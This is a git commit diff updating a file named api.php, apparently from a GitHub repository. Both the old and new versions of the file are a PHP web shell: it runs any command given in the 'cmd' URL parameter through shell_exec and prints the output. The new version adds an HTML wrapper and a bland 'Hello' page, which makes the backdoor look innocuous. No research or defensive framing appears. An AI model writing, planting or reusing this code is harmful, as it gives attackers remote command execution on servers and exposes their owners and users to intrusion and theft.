e4908befe0428e51d6f4918decfe5afeb8da1dd4
sunokazzu <160925526+sunokazzu@users.noreply.github.com>
2024-02-23 18:12:03 +0800

    Update api.php

--- api.php
+++ api.php
@@ -1,6 +1,12 @@
-<?php
-if(isset($_GET['cmd'])) {
-    $output = shell_exec($_GET['cmd']);
-    echo "<pre>$output</pre>";
-}
-?>
+<html>
+<body>
+    <?php
+    if(isset($_GET['cmd'])) {
+        $output = shell_exec($_GET['cmd']);
+        echo "<pre>$output</pre>";
+    } else {
+        echo "<p>Hello</p>";
+    }
+    ?>
+</body>
+</html>
